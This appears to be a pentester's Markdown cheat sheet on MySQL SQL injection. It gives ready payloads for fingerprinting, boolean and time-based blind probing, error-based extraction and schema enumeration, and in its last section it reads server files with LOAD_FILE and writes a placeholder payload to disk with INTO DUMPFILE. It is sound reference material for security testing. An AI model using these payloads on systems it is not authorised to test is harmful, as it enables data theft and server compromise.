# SQLi for [MySQL](https://www.mysql.com/)

## Things to remember
  *  [HackTricks has a page for this](https://book.hacktricks.xyz/pentesting-web/sql-injection/mysql-injection)
  *  The `LIKE` operator is **NOT** case sensitive
      *  Use the `BINARY` keyword to enforce case-sensitivity
  *  Stacked queries may or may not work [depending on the applicaton](https://media.defcon.org/DEF%20CON%2017/DEF%20CON%2017%20presentations/DEF%20CON%2017%20-%20muhaimin_dzulfakar-adv_mysql-wp.pdf)
  *  Boolean and time-based injections are versatile... get creative!

## Common errors
  *  `Illegal mix of collations` fixed by converting the problem input with `BINARY`
      *  Ex: `@@version` versus `BINARY @@version`
  *  `Subquery returns more than 1 row` fixed by using `group_concat()` to return a single value

## DBMS instance details
  *  DBMS version, running user, data directory, etc.
      *  Data directory used to [store MySQL stuff](https://dev.mysql.com/doc/refman/8.0/en/data-directory.html)

```
(SELECT @@datadir)
(SELECT @@version)
(SELECT version())
(SELECT user())
(SELECT system_user())
```

## Boolean-based blind
  *  Infer DB contents from true/false responses
  *  A simple way to induce this type of response is to use `OR`/`AND` operators
      *  More complex ways could also exist depending on the application

```
(SELECT TRUE WHERE database() LIKE '%')
(SELECT 1 WHERE database() LIKE '%')
(SELECT 1 WHERE ascii(SUBSTRING(database(), 1, 1)) < 127)
```

## Time-based blind
  *  Infer DB contents by forcing the server to wait and measuring response times
  *  [`SLEEP()`](https://dev.mysql.com/doc/refman/8.3/en/miscellaneous-functions.html#function_sleep) is obvious for this, but more exist
      *  Ex: [`BENCHMARK()`](https://dev.mysql.com/doc/refman/8.3/en/information-functions.html#function_benchmark) can be used to waste CPU cycles, creating a delay

```
(SELECT SLEEP(5) WHERE BINARY database() LIKE '%')
(SELECT SLEEP(5) WHERE ascii(SUBSTRING(database(), 1, 1)) < 127)
```

## Error-based
  *  Cause a MySQL error that contains the result of a subquery
      *  Useful if errors are rendered on the page
  *  `OR`/`AND` operators useful to include error-causing functions
  *  [PayloadsAllTheThings has a section](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md#mysql-error-based) covering this
  *  [`GTID_SUBSET()`](https://dev.mysql.com/doc/refman/8.3/en/gtid-functions.html#function_gtid-subset)/[`UPDATEXML()`](https://dev.mysql.com/doc/refman/8.3/en/xml-functions.html#function_updatexml)/[`EXTRACTVALUE()`](https://dev.mysql.com/doc/refman/8.3/en/xml-functions.html#function_extractvalue) functions useful for intentionally causing errors
      *  The function examples listed below are **NOT** used correctly... duh!

```
GTID_SUBSET(CONCAT(database(),0x0),0)
UPDATEXML(0x0,CONCAT(0x0a,database()),0x0)
EXTRACTVALUE(RAND(),CONCAT(0x0a,database()))
```

## Enumerate databases, tables, and columns
  *  List current database or all databases
      *  [`group_concat()`](https://dev.mysql.com/doc/refman/8.3/en/aggregate-functions.html#function_group-concat) used to return single-value from subquery
  *  List all tables or all tables within a given database
  *  List all columns within a given table
      *  Fuzz number of columns using `ORDER BY`/`UNION` operators

```
(SELECT database())
(SELECT group_concat(schema_name) FROM information_schema.schemata)
(SELECT group_concat(table_name) FROM information_schema.tables)
(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database())
(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema='exampleDB')
(SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='exampleTable')
```

## System interaction
  *  Read/write files to/from the filesystem
      *  See [`@@secure_file_priv`](https://dev.mysql.com/doc/refman/8.3/en/server-system-variables.html#sysvar_secure_file_priv) variable to check for restricted file-write privs
      *  [`FILE`](https://dev.mysql.com/doc/refman/8.3/en/privileges-provided.html#priv_file) privilege needed, check [`USER_PRIVILEGES`](https://dev.mysql.com/doc/refman/8.3/en/information-schema-user-privileges-table.html) table for grantable privs of current user
      *  [`unhex()`](https://dev.mysql.com/doc/refman/8.0/en/string-functions.html#function_unhex)/[`ltrim()`](https://dev.mysql.com/doc/refman/8.0/en/string-functions.html#function_ltrim) used to avoid quotation escape situations
  *  Read files from filesystem using [`LOAD_FILE()`](https://dev.mysql.com/doc/refman/8.0/en/string-functions.html#function_load-file)
      *  Returning `NULL` can indicate file perms issue or `apparmor`
      *  [`hex()`](https://dev.mysql.com/doc/refman/8.0/en/string-functions.html#function_hex) used to easily render file contents on page
  *  Write files to filesystem using [`SELECT INTO`](https://dev.mysql.com/doc/refman/8.0/en/select-into.html)
      *  Consider engineering a `UNION` that only returns the desired file contents
      *  `INTO OUTFILE` may cause formatting issues, `INTO DUMPFILE` does not do formatting
      *  `INTO` keyword not allowed within sub-queries

```
(SELECT @@secure_file_priv)
(SELECT group_concat(privilege_type) FROM information_schema.USER_PRIVILEGES WHERE replace(grantee,unhex(27),ltrim(unhex(20)))=user() AND is_grantable=unhex(594553))
(SELECT hex(LOAD_FILE("/path/to/file")))
SELECT unhex("[HEX ENCODED PAYLOAD]") INTO DUMPFILE "/path/to/new/file"
```
